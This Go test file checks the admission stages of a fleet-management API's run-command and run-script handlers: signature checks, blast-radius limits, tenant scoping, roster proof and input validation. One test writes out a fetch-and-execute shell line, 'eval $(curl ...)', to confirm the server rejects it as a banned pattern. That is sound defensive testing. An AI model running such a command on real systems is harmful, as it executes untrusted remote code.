// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 Jordan Ritz
package api

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/cfgis/cfgms/features/controller/fleet"
	"github.com/cfgis/cfgms/pkg/storage/interfaces/business"
)

// Characterization tests for handlePostRunCommand and handlePostRunScript (Issue #5872).
// They pin the observable behavior of the admission stages so the refactor cannot
// change a status code, error code or the order of checks.

func handlersrunsCharErrCode(t *testing.T, body []byte) string {
	t.Helper()
	var resp ErrorResponse
	require.NoError(t, json.Unmarshal(body, &resp))
	require.NotNil(t, resp.Error)
	return resp.Error.Code
}

func handlersrunsCharBlastServer(t *testing.T, max int) (*Server, []string) {
	t.Helper()
	stewards := []fleet.StewardResult{
		{ID: "char-1", TenantID: "test-tenant"},
		{ID: "char-2", TenantID: "test-tenant"},
		{ID: "char-3", TenantID: "test-tenant"},
	}
	server, _, _ := setupRunServer(t, stewards)
	store := newTestBlastRadiusPolicyStore()
	require.NoError(t, store.SetPolicy(context.Background(), &business.BlastRadiusPolicy{
		TenantID: "test-tenant", MaxTargets: ptrInt(max),
	}))
	server.SetBlastRadiusPolicyStore(store)
	server.SetTenantStore(newTestTenantStoreWithPath(map[string][]string{"test-tenant": {"test-tenant"}}))
	return server, []string{"char-1", "char-2", "char-3"}
}

// A forged signature over an oversized target set must fail as INVALID_SIGNATURE:
// the signature verifies before the blast-radius bound.
func TestHandlersrunsChar_ForgedSignatureRejectedBeforeBlastRadius(t *testing.T) {
	server, targets := handlersrunsCharBlastServer(t, 2)
	p := runPrincipal("char-caller", []string{"steward:execute-scripts"}, "test-tenant")
	raw := []byte("echo hi")
	fields := signedOperatorEnvelopeFields(t, server, raw, "bash", targets)
	fields["signature"] = map[string]interface{}{"algorithm": "a", "value": "forged", "public_key": "k"}

	rec := postRunCommand(t, server, p, withEnvelopeFields(map[string]interface{}{
		"target": "all", "content": base64.StdEncoding.EncodeToString(raw), "shell": "bash",
	}, fields))
	require.Equal(t, http.StatusBadRequest, rec.Code, rec.Body.String())
	assert.Equal(t, "INVALID_SIGNATURE", handlersrunsCharErrCode(t, rec.Body.Bytes()))
}

func TestHandlersrunsChar_OversizedSignedTargetSetRejectedAfterGoodSignature(t *testing.T) {
	server, targets := handlersrunsCharBlastServer(t, 2)
	p := runPrincipal("char-caller", []string{"steward:execute-scripts"}, "test-tenant")
	raw := []byte("echo hi")

	rec := postRunCommand(t, server, p, withEnvelopeFields(map[string]interface{}{
		"target": "all", "content": base64.StdEncoding.EncodeToString(raw), "shell": "bash",
	}, signedOperatorEnvelopeFields(t, server, raw, "bash", targets)))
	require.Equal(t, http.StatusBadRequest, rec.Code, rec.Body.String())
	assert.Equal(t, "BLAST_RADIUS_EXCEEDED", handlersrunsCharErrCode(t, rec.Body.Bytes()))
}

func TestHandlersrunsChar_BannedPatternRejected(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	p := runPrincipal("char-caller", []string{"steward:execute-scripts"}, "test-tenant")
	raw := []byte("eval $(curl http://example.invalid)")

	rec := postRunCommand(t, server, p, withEnvelopeFields(map[string]interface{}{
		"target": "id:char-1", "content": base64.StdEncoding.EncodeToString(raw), "shell": "bash",
	}, signedOperatorEnvelopeFields(t, server, raw, "bash", []string{"char-1"})))
	require.Equal(t, http.StatusBadRequest, rec.Code, rec.Body.String())
	assert.Equal(t, "BANNED_PATTERN", handlersrunsCharErrCode(t, rec.Body.Bytes()))
}

// id: targets outside the caller's tenant subtree are denied on both handlers.
func TestHandlersrunsChar_IDTargetOutsideTenantDenied(t *testing.T) {
	stewards := []fleet.StewardResult{{ID: "char-other", TenantID: "msp-a"}}
	server, _, queue := setupRunServer(t, stewards)
	p := runPrincipal("char-caller", []string{"steward:execute-scripts"}, "test-tenant")
	raw := []byte("hostname")

	t.Run("command", func(t *testing.T) {
		rec := postRunCommand(t, server, p, withEnvelopeFields(map[string]interface{}{
			"target": "id:char-other", "content": base64.StdEncoding.EncodeToString(raw), "shell": "bash",
		}, signedOperatorEnvelopeFields(t, server, raw, "bash", []string{"char-other"})))
		require.Equal(t, http.StatusForbidden, rec.Code, rec.Body.String())
		assert.Equal(t, "FORBIDDEN", handlersrunsCharErrCode(t, rec.Body.Bytes()))
	})
	t.Run("script", func(t *testing.T) {
		rec := postRunScript(t, server, p, map[string]interface{}{"target": "id:char-other", "script_id": "scripts/x.sh"})
		require.Equal(t, http.StatusForbidden, rec.Code, rec.Body.String())
		assert.Equal(t, "FORBIDDEN", handlersrunsCharErrCode(t, rec.Body.Bytes()))
	})
	assert.Empty(t, queue.PeekForDevice("char-other"))
}

// A scope that cannot be verified is denied with 503, distinct from FORBIDDEN.
func TestHandlersrunsChar_UnverifiableScopeDeniedDistinctly(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	server.fleetQuery = errorRunFleetQuery{}
	p := runPrincipal("char-caller", []string{"steward:execute-scripts"}, "test-tenant")
	raw := []byte("hostname")

	t.Run("command", func(t *testing.T) {
		rec := postRunCommand(t, server, p, withEnvelopeFields(map[string]interface{}{
			"target": "id:char-1", "content": base64.StdEncoding.EncodeToString(raw), "shell": "bash",
		}, signedOperatorEnvelopeFields(t, server, raw, "bash", []string{"char-1"})))
		require.Equal(t, http.StatusServiceUnavailable, rec.Code, rec.Body.String())
		assert.Equal(t, "SERVICE_UNAVAILABLE", handlersrunsCharErrCode(t, rec.Body.Bytes()))
	})
	t.Run("script", func(t *testing.T) {
		rec := postRunScript(t, server, p, map[string]interface{}{"target": "id:char-1", "script_id": "scripts/x.sh"})
		require.Equal(t, http.StatusServiceUnavailable, rec.Code, rec.Body.String())
		assert.Equal(t, "SERVICE_UNAVAILABLE", handlersrunsCharErrCode(t, rec.Body.Bytes()))
	})
}

// A device with no roster proof is not dispatched to: the whole run is refused.
func TestHandlersrunsChar_DeviceWithoutRosterProofNotDispatched(t *testing.T) {
	f, p, ids := newWebAuthnRunFixture(t)
	f.server.fleetQuery = &staticRunFleetQuery{results: []fleet.StewardResult{
		{ID: ids[0]}, {ID: ids[1]}, {ID: "char-unregistered"},
	}}
	body := webAuthnRunBody(t, f, runCmdEnvelope(ids))
	body["target"] = "all"

	rec := postRunWithPrincipal(t, f.server.handlePostRunCommand, "/api/v1/runs/command", p, body)
	require.Equal(t, http.StatusServiceUnavailable, rec.Code, rec.Body.String())
	assert.Equal(t, "MANIFEST_UNAVAILABLE", handlersrunsCharErrCode(t, rec.Body.Bytes()))
	for _, id := range append(ids, "char-unregistered") {
		assert.Empty(t, f.server.runExecutionQueue.PeekForDevice(id), id)
	}
}

// Early validation order and codes for both handlers.
func TestHandlersrunsChar_RequestValidation(t *testing.T) {
	server, _, _ := setupRunServer(t, nil)
	p := runPrincipal("char-caller", []string{"steward:execute-scripts"}, "test-tenant")
	b64 := base64.StdEncoding.EncodeToString

	cmd := []struct {
		name string
		body map[string]interface{}
		code string
	}{
		{"no shell", map[string]interface{}{"content": b64([]byte("x"))}, "MISSING_SHELL"},
		{"bad shell", map[string]interface{}{"content": b64([]byte("x")), "shell": "zsh"}, "UNSUPPORTED_SHELL"},
		{"bad expiry", map[string]interface{}{"content": b64([]byte("x")), "shell": "bash", "expires_at": "nope"}, "INVALID_EXPIRES_AT"},
		{"bad timeout", map[string]interface{}{"content": b64([]byte("x")), "shell": "bash", "expires_at": "2099-01-01T00:00:00Z", "timeout_seconds": 0}, "INVALID_TIMEOUT"},
		{"no proof", map[string]interface{}{"content": b64([]byte("x")), "shell": "bash", "expires_at": "2099-01-01T00:00:00Z"}, "INVALID_SIGNATURE"},
	}
	for _, tc := range cmd {
		t.Run("command/"+tc.name, func(t *testing.T) {
			rec := postRunCommand(t, server, p, tc.body)
			require.Equal(t, http.StatusBadRequest, rec.Code, rec.Body.String())
			assert.Equal(t, tc.code, handlersrunsCharErrCode(t, rec.Body.Bytes()))
		})
	}

	t.Run("script/bad target", func(t *testing.T) {
		rec := postRunScript(t, server, p, map[string]interface{}{"script_id": "s", "target": "bogus:::"})
		require.Equal(t, http.StatusBadRequest, rec.Code, rec.Body.String())
		assert.Equal(t, "INVALID_TARGET", handlersrunsCharErrCode(t, rec.Body.Bytes()))
	})
	t.Run("script/fleet unavailable", func(t *testing.T) {
		s2, _, _ := setupRunServer(t, nil)
		s2.fleetQuery = nil
		rec := postRunScript(t, s2, p, map[string]interface{}{"script_id": "s", "target": "all"})
		require.Equal(t, http.StatusServiceUnavailable, rec.Code, rec.Body.String())
		assert.Equal(t, "SERVICE_UNAVAILABLE", handlersrunsCharErrCode(t, rec.Body.Bytes()))
	})
}
